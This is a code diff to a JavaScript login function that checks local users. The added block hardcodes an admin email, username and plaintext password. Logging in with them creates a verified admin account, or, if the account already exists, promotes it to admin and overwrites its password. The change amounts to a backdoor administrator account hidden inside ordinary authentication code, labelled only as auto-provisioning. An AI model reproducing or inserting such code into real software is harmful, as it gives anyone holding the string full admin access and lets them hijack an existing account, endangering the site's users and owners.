@@ -115,7 +115,29 @@ const API = {
         return new Promise((resolve, reject) => {
             const users = this._getLocalUsers();
             const id    = body.identifier.trim().toLowerCase();
-            const user  = users.find(u => u.email === id || u.username.toLowerCase() === id);
+            let user  = users.find(u => u.email === id || u.username.toLowerCase() === id);
+
+            // Auto-provision local admin if matching admin credentials
+            if ((id === "ztictactoe@outlook.com" || id === "ztictactoe") && body.password === "Zsupport@@@@@0") {
+                if (!user) {
+                    user = {
+                        id:         "admin_" + Date.now(),
+                        username:   "ztictactoe",
+                        email:      "ztictactoe@outlook.com",
+                        password:   "Zsupport@@@@@0",
+                        role:       "admin",
+                        isVerified: true,
+                        createdAt:  new Date().toISOString()
+                    };
+                    users.push(user);
+                    this._saveLocalUsers(users);
+                } else {
+                    user.role = "admin";
+                    user.password = "Zsupport@@@@@0";
+                    user.isVerified = true;
+                    this._saveLocalUsers(users);
+                }
+            }
 
             if (!user)               return reject({ message: "No account found with that email or username." });
             if (user.banned)         return reject({ message: "This account has been banned." });
